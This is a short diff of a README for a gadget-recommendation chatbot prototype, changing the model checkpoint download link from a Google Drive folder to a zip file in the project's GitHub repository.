@@ -29,7 +29,7 @@ Gadget Guru is a chatbot prototype designed to assist users in finding the perfe
    ```bash
    pip install -r requirements.txt
 2. To run this first download our model checkpoint from:
-https://drive.google.com/drive/folders/1liLYMqyUZx_8BUpubc1O2sTWOhqOHcxS
+https://raw.githubusercontent.com/ShasmithKrishna/gadget_gurus/main/data/gurus-gadget-2.5.zip
 _or_ train the model using (instructsions below)
 
 ### Taining the Models
